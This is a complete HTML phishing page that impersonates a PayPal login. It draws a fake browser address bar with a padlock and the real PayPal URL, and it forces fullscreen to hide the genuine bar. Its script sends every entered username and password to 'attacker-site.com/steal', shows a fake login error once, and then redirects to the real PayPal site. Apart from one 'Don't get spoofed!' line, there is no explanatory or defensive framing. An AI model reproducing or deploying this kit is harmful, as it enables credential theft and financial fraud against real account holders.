<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { overflow: hidden; }
        
        /* Fake Browser UI */
        .fake-browser-bar {
            width: 100%;
            height: 40px;
            background: #f8f8f8;
            display: flex;
            align-items: center;
            padding: 5px 15px;
            font-size: 14px;
            color: black;
            border-bottom: 2px solid #ccc;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 99999;
        }
        .fake-lock { color: green; margin-right: 5px; }
        .fake-url { color: black; font-weight: bold; }

        /* Fullscreen Overlay */
        #overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        /* Fake Login Page */
        .login-box {
            width: 300px;
            padding: 20px;
            background: #fff;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            text-align: center;
        }
        .login-box h2 { margin-bottom: 15px; }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-box button:hover { background: #0056b3; }
        .warning { margin-top: 10px; color: red; font-weight: bold; }
    </style>
</head>
<body>

    <!-- Fake Browser UI -->
    <div class="fake-browser-bar">
        <span class="fake-lock">ðŸ”’</span>
        <span class="fake-url">https://www.paypal.com</span>
    </div>

    <!-- Fullscreen Fake Login Overlay -->
    <div id="overlay">
        <div class="login-box">
            <h2>Sign in to PayPal</h2>
            <form id="login-form">
                <input type="text" id="username" placeholder="Email or mobile number" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <p class="warning">Don't get spoofed!</p>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            enterFullscreen();
        });

        function enterFullscreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) { 
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) { 
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { 
                elem.msRequestFullscreen();
            }
        }

        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent real form submission

            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;

            // Send credentials to attacker's server
            fetch("https://attacker-site.com/steal", {
                method: "POST",
                body: JSON.stringify({ username, password }),
                headers: { "Content-Type": "application/json" }
            });

            // Fake error message once, then redirect to real site
            if (!sessionStorage.getItem("tried")) {
                alert("Invalid username or password");
                sessionStorage.setItem("tried", "1"); 
            } else {
                document.getElementById("overlay").style.display = "none";
                window.location.href = "https://www.paypal.com"; // Redirect to real site
            }
        });
    </script>

</body>
</html>
